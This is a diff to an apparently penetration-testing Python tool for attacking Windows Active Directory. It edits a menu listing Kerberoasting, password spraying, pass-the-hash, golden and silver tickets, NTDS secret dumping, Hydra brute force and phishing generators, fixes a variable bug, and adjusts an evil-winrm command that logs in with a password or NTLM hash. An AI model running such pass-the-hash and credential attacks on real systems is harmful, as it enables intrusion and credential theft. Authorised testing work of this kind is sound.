@@ -538,13 +538,13 @@ def options():
    print('\u2551' + " (01) Re/Set DNS  SERVER (12) Sync SERVER Time (21) Get Arch (31) WinLDAP Search  (41) Kerberos Info (51) Golden  PAC (61) Editor USER (78) Hydra  FTP (89) FTP    " + '\u2551')
    print('\u2551' + " (02) Re/Set REMOTE   IP (13) Whois DNS SERVER (22) Net View (32) Lookup Sec IDs  (42) KerberoFilter (52) Domain Dump (62) Editor PASS (79) Hydra  SSH (90) SSH    " + '\u2551')
    print('\u2551' + " (03) Re/Set LIVE  PORTS (14) dig   DNS SERVER (23) Services (33) Sam Dump Users  (43) KerberosBrute (53) *BloodHound (63) Editor HASH (80) Hydra  SMB (91) SSH ID " + '\u2551')
-   print('\u2551' + " (04) Re/Set WEBSITE URL (15) Recon DNS SERVER (24) At  Exec (34) REGistry Hives  (44) Kerberoasting (54) *BH  ACLPwn (64) Editor HOST (81) Hydra POP3 (92) Telnet " + '\u2551')
-   print('\u2551' + " (05) Re/Set USER   NAME (16) Dump  DNS SERVER (25) Dcom Exe (35) List EndPoints  (45) Kerbero Spray (55) SecretsDump (65) GenSSHkeyID (82) Hydra HTTP (93) NetCat " + '\u2551')
-   print('\u2551' + " (06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (26) Ps  Exec (36) RpcClient Serv  (46) PASSWORD2HASH (56) CrackMapExe (66) GenListUser (83) Hydra  TOM (94) SQSH   " + '\u2551')
-   print('\u2551' + " (07) Re/Set NTLM   HASH (18) NMap PORTService (27) Smb Exec (37) SmbClient Serv  (47) HASHs Sprayer (57) PSExec HASH (67) GenListPass (84) MSF TOMCAT (95) MS SQL " + '\u2551')
-   print('\u2551' + " (08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (28) Wmi Exec (38) Smb Map SHARES  (48) Pass the HASH (58) SmbExecHASH (74) GenPhishCod (85) RemoteSync (96) My SQL " + '\u2551')
-   print('\u2551' + " (09) Re/Set DOMAIN NAME (20) Nmap SERVER Time (29) If   Map (39) Smb Dump Files  (49) Silver Ticket (59) WmiExecHASH (75) AutoPhisher (86) RSyncDumps (97) WinRem " + '\u2551')
-   print('\u2551' + " (10) Re/Set DOMAIN  SID                       (30) Op  Dump (40) SmbMount SHARE  (50) Golden Ticket (60) NTDSDecrypt (76) Dir Searchs (87) RemDesktop (98)        " + '\u2551')
+   print('\u2551' + " (04) Re/Set WEBSITE URL (15) Recon DNS SERVER (24) AT  Exec (34) REGistry Hives  (44) Kerberoasting (54) *BH  ACLPwn (64) Editor HOST (81) Hydra POP3 (92) Telnet " + '\u2551')
+   print('\u2551' + " (05) Re/Set USER   NAME (16) Dump  DNS SERVER (25) DCOMExec (35) List EndPoints  (45) Kerbero Spray (55) SecretsDump (65) GenSSHkeyID (82) Hydra HTTP (93) NetCat " + '\u2551')
+   print('\u2551' + " (06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (26) PS  Exec (36) RpcClient Serv  (46) PASSWORD2HASH (56) CrackMapExe (66) GenListUser (83) Hydra  TOM (94) SQSH   " + '\u2551')
+   print('\u2551' + " (07) Re/Set NTLM   HASH (18) NMap PORTService (27) SMB Exec (37) SmbClient Serv  (47) HASHs Sprayer (57) PSExec HASH (67) GenListPass (84) MSF TOMCAT (95) MS SQL " + '\u2551')
+   print('\u2551' + " (08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (28) WMI Exec (38) Smb Map SHARES  (48) Pass the HASH (58) SmbExecHASH (74) GenPhishCod (85) RemoteSync (96) My SQL " + '\u2551')
+   print('\u2551' + " (09) Re/Set DOMAIN NAME (20) Nmap SERVER Time (29) MGMT Map (39) Smb Dump Files  (49) Silver Ticket (59) WmiExecHASH (75) AutoPhisher (86) RSyncDumps (97) WinRm  " + '\u2551')
+   print('\u2551' + " (10) Re/Set DOMAIN  SID                       (30) MGMTDump (40) SmbMount SHARE  (50) Golden Ticket (60) NTDSDecrypt (76) Dir Searchs (87) RemDesktop (98)        " + '\u2551')
    print('\u2551' + " (11) Re/Set SHARE  NAME                                                                                              (77) Nikto Scans (88) XemDesktop (99) Exit   " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
@@ -1991,7 +1991,7 @@ while True:
          
          if test1 != "":
             found = 1
-            USR,PAS = testOne.split(":")
+            USR,PAS = test1.split(":")
             USR = spacePadding(USR, COL1)
             PAS = spacePadding(PAS, COL1)
             TGT = privCheck(TGT) 
@@ -3267,9 +3267,9 @@ while True:
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using the HASH value as a password credential...")
-            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s ./" + httpDir + "/ -e " + httpDir + "/")
+            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
          else:
-            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s ./" + httpDir + "/ -e " + httpDir + "/")
+            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
